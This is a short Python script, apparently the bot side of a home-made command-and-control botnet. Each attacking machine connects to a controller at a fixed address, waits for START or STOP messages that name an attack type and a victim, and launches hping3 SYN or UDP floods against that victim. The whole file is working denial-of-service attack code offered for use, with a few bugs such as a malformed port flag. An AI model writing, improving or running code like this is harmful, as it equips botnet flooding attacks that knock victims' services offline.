# This will run on every attacker
# This will listen for a message to start (or stop) an attack
# This is essentially sort of a command & control system
import subprocess
import socket
import sys

attack = None
CommandServer = ('192.168.2.2', 666)

def endProc(proc):
	if proc != None:
		proc.terminate()
		print 'termiated'

if __name__=='__main__':
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.connect(CommandServer)
	# Listen for command from command server
	while True:
		data = server.recv(1024)
		if data == '':
			server.connect(CommandServer)

		# Look at how many data fields have been recieved
		NumberOfStatements = data.count('/') + 1

		if NumberOfStatements == 3:
			command, atkType, victim = data.split('/')
			print command
			print atkType
			print victim
		elif NumberOfStatements == 2:
			command, victim = data.split('/')
			print command
			print victim

		#Start or stop
		if command == 'START':
			if atkType == 'syn':
				print 'Running a SYN attack...'
				endProc(attack) # terminate previous
				#attack = subprocess.Popen(["ping", '127.0.0.1'], stdout=sys.stdout)
				attack = subprocess.Popen(["hping3","-S","--flood","-V", victim], stdout=subprocess.PIPE)
			elif atkType == 'udp':
				print 'Running a UDP attack...'
				endProc(attack) # terminate previous
				attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "666", victim], stdout=subprocess.PIPE)
		elif command == 'STOP':
			endProc(attack)
			print 'Attack stopped'